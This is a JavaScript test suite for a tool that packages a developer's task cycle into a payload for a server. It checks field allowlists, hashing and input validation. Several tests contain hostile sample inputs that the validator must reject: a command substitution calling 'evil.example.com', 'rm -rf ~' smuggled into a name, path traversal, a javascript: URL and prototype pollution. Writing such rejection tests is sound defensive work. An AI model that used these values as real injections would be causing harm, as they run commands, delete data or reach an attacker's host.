import assert from 'node:assert/strict';
import { mkdir, readdir, readFile, rm, writeFile } from 'node:fs/promises';
import { join } from 'node:path';
import { describe, test } from 'node:test';
import { cycleIdFileName, ensureCycleId, readCycleId } from '../scripts/report/cycle-id.mjs';
import { buildModel } from '../scripts/report/model.mjs';
import { buildPayload, canonicalHash, manifestOf, rawFromPayload, sha256, validatePayload } from '../scripts/report/payload.mjs';
import { createReader } from '../scripts/report/read.mjs';
import { specs } from './fixtures/specs.mjs';
import { materializeTemp } from './helpers/cycle.mjs';
import { CYCLE_ID, NOW, comparable, roundTrip } from './helpers/trip.mjs';

const rejects = (promise, status) => assert.rejects(promise, (error) => error.status === status);
const throws = (fn, status) => assert.throws(fn, (error) => error.status === status);

describe('a cycle survives the trip to a payload and back', () => {
  for (const name of Object.keys(specs)) {
    test(`${name}: the model is the same`, async () => {
      const trip = await roundTrip(specs[name]);
      try {
        assert.deepEqual(comparable(trip.fromPayload), comparable(trip.fromFiles));
        assert.equal(trip.back.cycle.dir, null, 'no laptop path reaches the server');
      } finally {
        await rm(trip.dir, { recursive: true, force: true });
      }
    });
  }

  test('key order and name order are the sender\'s, not a sorter\'s', async () => {
    const trip = await roundTrip(specs.shuffled);
    try {
      assert.deepEqual(Object.keys(trip.back.index.tasks), Object.keys(trip.raw.index.tasks));
      assert.deepEqual(trip.back.attachments.zz9.map((a) => a.name), trip.raw.attachments.zz9.map((a) => a.name));
      assert.notDeepEqual(trip.raw.attachments.zz9.map((a) => a.name), [...trip.raw.attachments.zz9.map((a) => a.name)].sort(), 'the fixture must disagree with a byte-order sort to prove anything');
      assert.ok(Object.values(trip.fromPayload.inbox).some((i) => i.kind === 'leftover-worktree'), 'enrichment travelled');
    } finally {
      await rm(trip.dir, { recursive: true, force: true });
    }
  });
});

describe('what a payload holds', () => {
  test('only the allowlist: no answers, no ticks, no archive, no config beyond four values', async () => {
    const trip = await roundTrip(specs['kitchen-sink']);
    try {
      assert.deepEqual(Object.keys(trip.wire).sort(), ['attachments', 'batchFiles', 'config', 'cycle', 'enrichment', 'index', 'locks', 'plans', 'pluginVersion', 'problems', 'pushedFrom', 'schema', 'summary']);
      assert.deepEqual(Object.keys(trip.wire.config).sort(), ['baseBranch', 'projectName', 'providerComments', 'providerEnrichment']);
      const text = JSON.stringify(trip.wire);
      assert.ok(!text.includes('stale-on-purpose'), 'the tick file stayed home');
      assert.ok(!text.includes('Archived task'), 'the archive stayed home');
      assert.ok(!text.includes(trip.dir), 'no path of this machine');
    } finally {
      await rm(trip.dir, { recursive: true, force: true });
    }
  });

  test('recorded answers never travel', async () => {
    const trip = await roundTrip(specs.questions);
    try {
      const text = JSON.stringify(trip.wire);
      assert.ok(text.includes('Which logo should the packing slip carry'), 'the question travels');
      assert.ok(!text.includes('top left') && !text.includes('am/pm, please'), 'what was answered does not');
    } finally {
      await rm(trip.dir, { recursive: true, force: true });
    }
  });

  test('another developer\'s batch files, and plans of tasks that are not in the index, stay home', async () => {
    const dir = await materializeTemp(specs.questions, NOW);
    try {
      await writeFile(join(dir, 'batches', 'batch-77.json'), JSON.stringify({ status: 'pending', tasks: {} }));
      await writeFile(join(dir, 'tasks', 'someone-elses.md'), '# Not mine\n');
      await mkdir(join(dir, 'attachments', 'someone-elses'), { recursive: true });
      await writeFile(join(dir, 'attachments', 'someone-elses', 'shot.png'), 'x');
      const raw = await createReader(dir).read();
      assert.ok(raw.batchFiles['batch-77'] && raw.plans['someone-elses'], 'the reader sees them');
      const { payload } = await buildPayload({ raw, cycleId: CYCLE_ID });
      assert.equal(payload.batchFiles['batch-77'], undefined);
      assert.equal(payload.plans['someone-elses'], undefined);
      assert.equal(payload.attachments['someone-elses'], undefined);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('a dependency that is not in the index still sends its batch file', async () => {
    const dir = await materializeTemp(specs.questions, NOW);
    try {
      const index = JSON.parse(await readFile(join(dir, 'state.sam.json'), 'utf8'));
      index.batches['batch-2'].depends_on = ['batch-77'];
      await writeFile(join(dir, 'state.sam.json'), JSON.stringify(index));
      await writeFile(join(dir, 'batches', 'batch-77.json'), JSON.stringify({ status: 'done', tasks: {} }));
      const { payload } = await buildPayload({ raw: await createReader(dir).read(), cycleId: CYCLE_ID });
      assert.equal(payload.batchFiles['batch-77'].data.status, 'done');
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('an index that cannot be read just now refuses the push instead of wiping the mirror', async () => {
    const dir = await materializeTemp(specs.questions, NOW);
    try {
      await writeFile(join(dir, 'state.sam.json'), '{ "tasks": ');
      await rejects(buildPayload({ raw: await createReader(dir).read(), cycleId: CYCLE_ID }), 409);
      await rm(join(dir, 'state.sam.json'));
      await rejects(buildPayload({ raw: await createReader(dir).read(), cycleId: CYCLE_ID }), 409);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('blobs are named by what the page will show', async () => {
    const trip = await roundTrip(specs.questions);
    try {
      const plan = trip.wire.plans.qs101;
      assert.equal(plan.sha256, sha256(Buffer.from(trip.raw.plans.qs101.markdown, 'utf8')));
      assert.deepEqual([...manifestOf(trip.wire).keys()].sort(), [...trip.blobs.keys()].sort());
    } finally {
      await rm(trip.dir, { recursive: true, force: true });
    }
  });

  test('a blob that never arrived is a health problem, not a crash', async () => {
    const trip = await roundTrip(specs['kitchen-sink']);
    try {
      const raw = rawFromPayload(trip.wire, { text: () => undefined, has: () => false });
      const model = buildModel(raw, { now: NOW });
      const problem = model.health.problems.find((p) => p.code === 'push-incomplete');
      assert.match(problem.message, /never arrived/);
      assert.equal(model.tasks.hb101.plan.exists, false);
    } finally {
      await rm(trip.dir, { recursive: true, force: true });
    }
  });

  test('a worktree path that could run inside a copied command is left out, and said so', async () => {
    const dir = await materializeTemp(specs.shuffled, NOW);
    try {
      const raw = await createReader(dir).read();
      const enrichment = { ...specs.shuffled.enrichment, worktrees: [{ path: '/tmp/$(curl evil.example.com)', branch: 'fix/hotfix-b' }, { path: '/tmp/`id`', branch: 'x' }] };
      const { payload } = await buildPayload({ raw, cycleId: CYCLE_ID, enrichment });
      assert.deepEqual(payload.enrichment.worktrees, []);
      assert.equal(payload.problems.filter((p) => p.code === 'worktree-path-unsafe').length, 2);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe('the hash that answers "did anything change"', () => {
  test('blind to when and where the push was made, and to key order', async () => {
    const trip = await roundTrip(specs.shuffled);
    try {
      const later = JSON.parse(JSON.stringify(trip.wire));
      later.pushedFrom = 'another-laptop';
      later.pluginVersion = '9.9.9';
      later.enrichment.asOf = '2030-01-01T00:00:00.000Z';
      for (const pr of Object.values(later.enrichment.prs)) pr.asOf = '2030-01-01T00:00:00.000Z';
      later.index = Object.fromEntries(Object.entries(later.index).reverse());
      assert.equal(canonicalHash(later), canonicalHash(trip.wire));

      later.batchFiles['batch-2'].data.status = 'in-progress';
      assert.notEqual(canonicalHash(later), canonicalHash(trip.wire));
    } finally {
      await rm(trip.dir, { recursive: true, force: true });
    }
  });
});

describe('what the server refuses', () => {
  const valid = async () => {
    const trip = await roundTrip(specs.shuffled);
    await rm(trip.dir, { recursive: true, force: true });
    return trip.wire;
  };

  test('a well-formed payload passes, and reports its size', async () => {
    assert.ok(validatePayload(await valid()) > 1000);
  });

  test('anything outside the allowlist, and names that are unsafe in an id, a URL or a command', async () => {
    const base = await valid();
    const broken = (change) => { const p = JSON.parse(JSON.stringify(base)); change(p); return () => validatePayload(p); };

    throws(broken((p) => { p.answers = {}; }), 400);
    throws(broken((p) => { p.cycle.id = 'live'; }), 400);
    throws(broken((p) => { p.index.tasks['../etc'] = p.index.tasks.zz9; }), 400);
    throws(broken((p) => { p.index.tasks['a:b'] = p.index.tasks.zz9; }), 400);
    throws(broken((p) => { p.index.batches['batch-1; rm -rf ~'] = { tasks: [] }; }), 400);
    throws(broken((p) => { p.batchFiles['batch-77'] = { exists: true, unreadable: false, mtimeMs: 1, data: null }; }), 400);
    throws(broken((p) => { p.plans.zz9.sha256 = 'short'; }), 400);
    throws(broken((p) => { p.plans.ghost = p.plans.zz9; }), 400);
    throws(broken((p) => { p.attachments.zz9[0].name = 'run.exe'; }), 400);
    throws(broken((p) => { p.attachments.zz9[0].name = '../../x.png'; }), 400);
    throws(broken((p) => { p.attachments.zz9[0].bytes = 11 * 1024 * 1024; }), 400);
    throws(broken((p) => { p.config.clickup = { token: 'x' }; }), 400);
    throws(broken((p) => { p.enrichment.worktrees[0].path = '/tmp/"$(id)"'; }), 400);
    throws(broken((p) => { p.enrichment.prs['javascript:alert(1)'] = {}; }), 400);
    throws(broken((p) => { p.index.tasks.zz9.constructor = { x: 1 }; }), 400);
    throws(() => validatePayload(JSON.parse(JSON.stringify(base).replace('"schema":1', '"schema":1,"__proto__":{"polluted":true}'))), 400);
    throws(broken((p) => { p.index.padding = 'x'.repeat(2 * 1024 * 1024); }), 413);
  });
});

describe('cycle identity', () => {
  test('minted once, stable after, and invisible to the reader', async () => {
    const dir = await materializeTemp(specs.questions, NOW);
    try {
      assert.equal(await readCycleId(dir, 'sam'), null);
      const before = await createReader(dir).read();
      const id = await ensureCycleId(dir, 'sam');
      assert.match(id, /^[0-9a-f-]{36}$/);
      assert.equal(await ensureCycleId(dir, 'sam'), id);
      assert.equal(await readCycleId(dir, 'sam'), id);

      const after = await createReader(dir).read();
      assert.deepEqual([after.cycle.indexFile, after.cycle.stateFiles, Object.keys(after.batchFiles)], [before.cycle.indexFile, before.cycle.stateFiles, Object.keys(before.batchFiles)]);
      assert.deepEqual((await readdir(dir)).filter((name) => name.endsWith('.tmp')), []);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('many callers at once agree on one id', async () => {
    const dir = await materializeTemp(specs.questions, NOW);
    try {
      const ids = await Promise.all(Array.from({ length: 12 }, () => ensureCycleId(dir, 'sam')));
      assert.equal(new Set(ids).size, 1);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('no index, no id: a lone id file would look like a live cycle to clean', async () => {
    const dir = await materializeTemp({ slug: 'sam' }, NOW);
    try {
      await assert.rejects(ensureCycleId(dir, 'sam'), /no cycle to name/);
      await assert.rejects(ensureCycleId(dir, '../sam'), /Not a developer slug/);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('a damaged id file is refused, never replaced: a new id would orphan the server\'s cycle', async () => {
    const dir = await materializeTemp(specs.questions, NOW);
    try {
      await writeFile(join(dir, cycleIdFileName('sam')), '{ "cycle_id": ');
      await assert.rejects(ensureCycleId(dir, 'sam'), /does not hold a cycle id/);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});
